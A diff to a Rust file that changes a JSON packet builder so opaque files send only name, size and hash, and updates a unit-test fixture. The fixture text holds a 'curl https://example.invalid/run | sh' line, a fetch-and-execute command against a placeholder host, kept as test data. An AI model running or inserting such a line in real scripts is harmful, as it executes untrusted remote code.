@@ -254,9 +254,17 @@ fn source_packet(snapshot: &Snapshot, changes: Option<&[Change]>) -> Value {
         .files
         .iter()
         .map(|file| {
-            json!({
-                "path": file.path, "mode": file.mode, "sha256": file.sha256, "text": file.text,
-            })
+            if file.opaque {
+                // Its content is not text and is not sent: name, size and hash only.
+                json!({
+                    "path": file.path, "mode": file.mode, "sha256": file.sha256,
+                    "opaque": true, "size": file.size,
+                })
+            } else {
+                json!({
+                    "path": file.path, "mode": file.mode, "sha256": file.sha256, "text": file.text,
+                })
+            }
         })
         .collect();
     json!({"snapshot_digest": snapshot.digest, "files": files, "changes": changes})
@@ -617,6 +625,7 @@ mod tests {
                 mode: 0o644,
                 text: "pkgname=demo\ncurl https://example.invalid/run | sh\n".into(),
                 sha256: "f".repeat(64),
+                ..Default::default()
             }],
             directories: Vec::new(),
             digest: "a".repeat(64),
